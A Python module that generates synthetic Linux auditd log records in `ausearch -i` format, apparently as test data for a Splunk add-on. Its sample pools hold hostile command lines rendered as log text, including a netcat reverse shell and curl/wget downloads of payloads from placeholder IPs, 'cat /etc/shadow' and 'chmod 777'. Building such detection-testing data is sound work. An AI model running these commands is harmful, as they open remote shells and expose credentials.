"""
Linux auditd Log Generator

Emits the format Splunk_TA_nix actually collects: the output of `ausearch -i`,
run by the add-on's own `[script://./bin/rlog.sh]` input — not the raw
/var/log/audit/audit.log.

The `-i` flag is the whole distinction. It resolves numeric ids to names
(uid=0 -> uid=root), rewrites the timestamp to `11/09/2026 18:00:00.123`, and
strips the quotes around values. Two details in the add-on confirm it is what
[auditd] expects: MAX_TIMESTAMP_LOOKAHEAD=23 is exactly that timestamp's width,
and the raw-format transform requires a closing quote that -i removes.

See references/auditd-sourcetypes.md for the documentary pass, including why
`linux_audit` — which looks better furnished — is a retired stanza kept only so
data from a withdrawn add-on still parses.
"""

import random
from datetime import datetime

from .ai_entity import AIEntityMixin


class AuditdLogGenerator(AIEntityMixin):
    """Generates Linux auditd records as `ausearch -i` renders them."""

    LOG_TYPE = 'auditd'
    AVG_LOG_SIZE = 320

    SOURCETYPE_CONFIG = {
        'param_key': 'event_categories',
        'defaults': ['authentication', 'account_management', 'privilege',
                     'execution', 'file_access'],
        'multi_instance': False,
    }

    METADATA = {
        'name': 'Linux auditd',
        'description': 'Linux audit daemon records (ausearch -i format)',
        'example': 'type=USER_AUTH msg=audit(...) : ... acct=alice res=success',
        'sources': [
            {'id': 'authentication',    'name': 'Authentication',
             'description': 'PAM authentication verdicts (USER_AUTH)'},
            {'id': 'account_management', 'name': 'Account Management',
             'description': 'User and group lifecycle (ADD_USER, DEL_USER, GRP_MGMT...)'},
            {'id': 'privilege',         'name': 'Privilege Escalation',
             'description': 'sudo command invocations (USER_CMD)'},
            {'id': 'execution',         'name': 'Process Execution',
             'description': 'Command execution records (EXECVE)'},
            {'id': 'file_access',       'name': 'File Access',
             'description': 'Watched path access (PATH)'},
        ],
    }

    #: `op` values the add-on's action lookup recognises
    #: (lookups/nix_linux_audit_action_object_category.csv). An operation outside
    #: this list yields no `action` and no `object_category`, so the event stays
    #: out of Change however it is tagged — the lookup drives the repertoire,
    #: not the other way round.
    ACCOUNT_OPS = [
        ('ADD_USER',  'add-user',                        '/usr/sbin/useradd'),
        ('ADD_USER',  'add-home-dir',                    '/usr/sbin/useradd'),
        ('ADD_GROUP', 'add-group',                       '/usr/sbin/groupadd'),
        ('ADD_GROUP', 'add-shadow-group',                '/usr/sbin/groupadd'),
        ('DEL_USER',  'delete-user',                     '/usr/sbin/userdel'),
        ('USER_MGMT', 'deleting-user-from-group',        '/usr/sbin/gpasswd'),
        ('USER_MGMT', 'deleting-user-from-shadow-group', '/usr/sbin/gpasswd'),
        ('DEL_GROUP', 'delete-group',                    '/usr/sbin/groupdel'),
        ('DEL_GROUP', 'delete-shadow-group',             '/usr/sbin/groupdel'),
    ]

    def __init__(self, event_categories=None):
        self.event_categories = event_categories or list(
            self.SOURCETYPE_CONFIG['defaults'])

        # Pools A&I overrides — see ENTITY_TYPE_ROLES / ACCOUNT_TYPE_ROLES.
        self.hostnames = ['web-server-01', 'db-primary', 'app-node-07',
                          'ns327395', 'debian-prod', 'build-runner-3']
        self.ip_addresses = ['10.0.0.24', '192.168.1.68', '172.16.0.19',
                             '203.0.113.77', '198.51.100.32']
        self.acct_users = ['alice', 'bob', 'deploy', 'jenkins', 'postgres',
                           'ansible', 'backup']
        self.admin_users = ['root', 'admin', 'sysop']

        self.terminals = ['pts/0', 'pts/1', 'ssh', 'tty1', '?']
        self.commands = [
            '/usr/bin/cat /etc/shadow', '/usr/bin/systemctl restart nginx',
            '/usr/bin/apt-get install -y curl', '/bin/chmod 777 /var/www',
            '/usr/bin/vi /etc/sudoers', '/usr/sbin/iptables -L',
        ]
        self.exec_argv = [
            ['/usr/bin/curl', '-s', 'http://198.51.100.9/payload.sh'],
            ['/bin/bash', '-c', 'id'],
            ['/usr/bin/wget', 'http://203.0.113.44/x'],
            ['/usr/bin/python3', '/tmp/.hidden/run.py'],
            ['/usr/bin/nc', '-e', '/bin/sh', '198.51.100.9', '4444'],
        ]
        self.watched_paths = ['/etc/passwd', '/etc/shadow', '/etc/sudoers',
                              '/etc/ssh/sshd_config', '/var/log/audit/audit.log']

        self._serial = random.randint(10000, 99999)

        self._builders = {
            'authentication':     self._user_auth,
            'account_management': self._account_management,
            'privilege':          self._user_cmd,
            'execution':          self._execve,
            'file_access':        self._path,
        }

    # ------------------------------------------------------------------

    def generate(self):
        """One auditd record, as ausearch -i renders it."""
        # One record describes one host and, when A&I pins one, its account.
        self._new_entity()

        active = [c for c in self.event_categories if c in self._builders]
        category = random.choice(active or list(self._builders))
        return self._builders[category]()

    # ------------------------------------------------------------------
    # Shared pieces
    # ------------------------------------------------------------------

    def _stamp(self):
        """`audit(11/09/2026 18:00:00.123:4242)` — the interpreted form.

        MAX_TIMESTAMP_LOOKAHEAD=23 in the add-on is exactly the width of the
        date-time part, so the layout is not cosmetic.
        """
        self._serial += 1
        now = datetime.now()
        return (f'audit({now.strftime("%m/%d/%Y %H:%M:%S")}'
                f'.{now.microsecond // 1000:03d}:{self._serial})')

    def _host(self):
        return self._entity_field('hostnames', lambda: random.choice(self.hostnames))

    def _addr(self):
        return self._entity_field('ip_addresses',
                                  lambda: random.choice(self.ip_addresses))

    def _acct(self):
        return self._entity_field('acct_users', lambda: random.choice(self.acct_users))

    def _admin(self):
        return random.choice(self.admin_users)

    @staticmethod
    def _head(record_type, stamp, **fields):
        body = ' '.join(f'{k}={v}' for k, v in fields.items())
        return f'type={record_type} msg={stamp} : {body}'

    # ------------------------------------------------------------------
    # Record types
    # ------------------------------------------------------------------

    def _user_auth(self):
        """PAM verdict. EVAL-op turns op=PAM:authentication into res, which the
        action lookup then maps to success / failure."""
        acct = self._acct()
        res = 'success' if random.random() < 0.75 else 'failed'
        inner = (f"op=PAM:authentication grantors=pam_unix acct={acct} "
                 f"exe=/usr/sbin/sshd hostname={self._host()} addr={self._addr()} "
                 f"terminal={random.choice(self.terminals)} res={res}")
        return self._head('USER_AUTH', self._stamp(),
                          pid=random.randint(400, 99999), uid='root',
                          auid=acct, ses=random.randint(1, 400),
                          msg=f"'{inner}'")

    def _account_management(self):
        record_type, op, exe = random.choice(self.ACCOUNT_OPS)
        actor = self._admin()
        target = self._acct()
        inner = (f"op={op} id={target} exe={exe} hostname={self._host()} "
                 f"addr={self._addr()} terminal={random.choice(self.terminals)} "
                 f"res=success")
        if record_type in ('ADD_GROUP', 'DEL_GROUP'):
            inner = inner.replace(f'id={target}', f'grp={target}-team id={target}')
        return self._head(record_type, self._stamp(),
                          pid=random.randint(400, 99999), uid=actor,
                          auid=actor, ses=random.randint(1, 400),
                          msg=f"'{inner}'")

    def _user_cmd(self):
        """sudo. `cmd=` is what an analyst pivots on; `exe=` feeds command=."""
        acct = self._acct()
        res = 'success' if random.random() < 0.85 else 'failed'
        inner = (f"cwd=/home/{acct} cmd={random.choice(self.commands)} "
                 f"exe=/usr/bin/sudo hostname={self._host()} "
                 f"terminal={random.choice(self.terminals)} res={res}")
        return self._head('USER_CMD', self._stamp(),
                          pid=random.randint(400, 99999), uid=acct,
                          auid=acct, ses=random.randint(1, 400),
                          msg=f"'{inner}'")

    def _execve(self):
        """The add-on stitches a0/a1/... into execve_command, so the arguments
        must be numbered from a0 for that EXTRACT to produce anything."""
        argv = random.choice(self.exec_argv)
        args = ' '.join(f'a{i}={v}' for i, v in enumerate(argv))
        return self._head('EXECVE', self._stamp(), argc=len(argv)) + f' {args}'

    def _path(self):
        """`[auditd_modify]` keys on `source=auditd PATH`, so this record type is
        the one that carries the `modify` tag — provided the source is emitted."""
        path = random.choice(self.watched_paths)
        owner = 'root'
        return self._head('PATH', self._stamp(),
                          item=0, name=path,
                          inode=random.randint(100000, 999999),
                          dev='fd:00', mode=f'file,{random.choice(["644", "600", "755"])}',
                          ouid=owner, ogid=owner, nametype='NORMAL')
